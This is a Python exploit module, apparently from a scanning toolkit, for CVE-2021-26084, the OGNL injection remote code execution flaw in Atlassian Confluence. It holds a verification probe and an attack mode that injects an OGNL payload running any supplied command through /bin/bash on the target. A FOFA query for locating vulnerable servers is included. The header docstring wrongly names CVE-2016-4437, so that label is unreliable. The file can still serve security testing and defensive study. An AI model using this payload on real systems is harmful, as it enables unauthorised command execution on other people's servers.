from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
import prettytable as pt
"""
cve_2016_4437 反序列化命令执行(可回显)
目标系统: windows、linux
"""
class AtlassianConfluence():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def cve_2021_26084(self):
        appName = 'Atlassian Confluence'
        pocname = 'cve_2021_26084'
        path = '/'
        method = 'post'
        desc = '<6.13.23, 6.14.0~7.4.11, 7.5.0~7.11.5, 7.12.0~7.12.5'
        fofa = 'Atlassian Confluence'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                paramsPost = {"queryString":"aaa\\u0027+\x23{\\u0022\\u0022[\\u0022class\\u0022]}+\\u0027bbb"}
                headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0","Content-Type":"application/x-www-form-urlencoded"}
                response = exprequest.post(self.url, data=paramsPost, headers=headers, verify=False)
                if "aaa{class java.lang.String=null}bbb" in response.text:
                    output.no_echo_success(method, desc)
                    self.status = 'success'
                else:
                    output.fail()

            #_attack
            else:
                paramsPost = {"queryString":"kkk\\u0027+\x23{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var x=new java.lang.ProcessBuilder;x.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027" + self.cmd + "\\u0027]);x.start()\\u0022)}+\\u0027"}
                headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0","Content-Type":"application/x-www-form-urlencoded"}
                response = exprequest.post(self.url, data=paramsPost, headers=headers, verify=False)
                if "kkk{Process" in response.text:
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
        except Exception as error:
            output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row(["Atlassian Confluence", "cve_2021_26084", "body=\"Atlassian Confluence\" , [rce]"])
print(tb)

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpAtlassianConfluence = AtlassianConfluence(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpAtlassianConfluence, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpAtlassianConfluence.status
    else:#调用所有函数
        for func in dir(AtlassianConfluence):
            if not func.startswith("__"):
                methodcaller(func)(ExpAtlassianConfluence)
                result_list.append(func+' -> '+ExpAtlassianConfluence.status)
                ExpAtlassianConfluence.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)
